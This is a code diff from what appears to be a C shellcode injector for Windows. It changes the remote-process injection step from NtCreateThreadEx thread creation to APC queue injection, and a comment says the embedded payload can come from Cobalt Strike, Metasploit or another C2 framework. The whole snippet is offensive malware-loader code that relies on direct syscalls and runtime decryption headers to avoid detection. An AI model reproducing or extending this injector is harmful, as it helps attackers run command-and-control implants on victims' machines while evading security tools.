@@ -3,6 +3,7 @@
 #include "connector.h"
 #include "syscalls.h"
 #include "jitdecrypt.h"
+#include "apis.h"
 
 // shellcode is from sektor7 rto course, but you can use cobalt strike / metasploit / whatever c2 else
 unsigned char payload[] = {
@@ -71,14 +72,11 @@ int remInj() {
         return 0;
     }
 
-    HANDLE hThread;
-    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuf, NULL, 0, 0, 0, 0, NULL);
-    if (status == 0) {
-        printf("Thread created successfully\n");
-        WaitForSingleObject(hThread, INFINITE);
+    if (QueueAPCInject_x64(processHandle, remoteBuf)) {
+        printf("APC queued successfully\n");
     }
     else {
-        printf("Failed to create thread\n");
+        printf("Failed to queue APC\n");
     }
 
     NtClose(processHandle);
